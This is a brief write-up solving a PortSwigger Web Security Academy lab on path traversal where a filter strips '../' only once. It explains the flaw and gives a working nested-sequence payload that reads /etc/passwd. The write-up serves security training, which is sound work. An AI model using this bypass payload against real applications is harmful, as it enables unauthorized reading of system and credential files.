# Lab: File path traversal, traversal sequences stripped non-recursively (Practitioner)

**Lab:** [https://portswigger.net/web-security/file-path-traversal/lab-sequences-stripped-non-recursively](https://portswigger.net/web-security/file-path-traversal/lab-sequences-stripped-non-recursively)

**Task (from PortSwigger):**  
This lab contains a path traversal vulnerability in the display of product images.

The application strips path traversal sequences from the user-supplied filename before using it.

To solve the lab, retrieve the contents of the `/etc/passwd` file.

## Vulnerability
Filter removes `../` once (non-recursively). Nested sequences like `....//` become `../` after one strip.

## Solution

```
filename=....//....//....//etc/passwd
```

After stripping `../` from the middle of `....//`, remaining path is `../../../etc/passwd`.

## Final Payload
```
....//....//....//etc/passwd
```
